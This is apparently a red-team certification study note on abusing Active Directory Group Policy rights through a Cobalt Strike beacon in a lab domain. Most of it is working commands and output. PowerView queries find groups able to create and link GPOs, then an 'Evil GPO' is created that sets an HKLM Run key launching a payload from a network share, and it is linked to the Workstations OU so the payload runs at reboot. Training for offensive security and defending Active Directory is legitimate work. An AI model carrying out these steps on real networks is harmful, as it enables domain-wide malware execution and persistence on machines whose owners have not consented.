
Group Policy Objects are stored in `_CN=Policies,CN=System_` - principals that can create new GPOs in the domain have the "`Create groupPolicyContainer objects`" privilege over this object.

#### 🖊️ what can we do

1) Find groups with the power to create GPOs
2) Check their rights
3) Resolve their SID (to find out who they are)
4) Link it to an OU
5) Wait for a reboot

#### 📔 via Cobalt Strike

1) Find groups that have "CreateChild" rights on the "Group-Policy-Container" via PowerView's `Get-DomainObjectAcl`

```
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

DEV\Developers
```

2) The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.

This is also something we can find with PowerView by first getting all of the domain OUs and piping them into Get-DomainObjectAcl again.  Iterate over each one looking for instances of "WriteProperty" over "GP-Link" .

```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

ObjectDN              : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : ReadProperty, WriteProperty
ObjectAceType         : GP-Link
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

  This shows that members of the "Developers" group can link GPOs to the "Workstations" OU.

3) GPOs can be managed from the command line via the PowerShell RSAT modules.  These are an optional install and so usually only found on management workstations.  The `Get-Module` cmdlet will show if they are present.

```
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

Key                        Value                     
---                        -----                     
Backup-GPO                 Backup-GPO                
Block-GPInheritance        Block-GPInheritance       
Copy-GPO                   Copy-GPO                  
Get-GPInheritance          Get-GPInheritance         
Get-GPO                    Get-GPO
```

4) Use the `New-GPO` cmdlet to create and link a new GPO.

```
beacon> powershell New-GPO -Name "Evil GPO"

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\bfarmer
Id               : 550f6672-bdd0-4e3d-8907-628ee6909f26
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 9/8/2022 1:30:17 PM
ModificationTime : 9/8/2022 1:30:17 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

5) Some abuses can be implemented directly using RSAT.  For example, the `Set-GPPrefRegistryValue` cmdlet can be used to add an HKLM autorun key to the registry.
```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
```

6) Next, apply the GPO to the target OU.

```
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

GpoId       : 550f6672-bdd0-4e3d-8907-628ee6909f26
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4
```

Remember that HKLM autoruns require a reboot to execute.



#### ⚠ Opsec



### Properties
---
📆 created   {{20-02-2024}} 22:19
🏷️ tags: #redteam #crto 

---

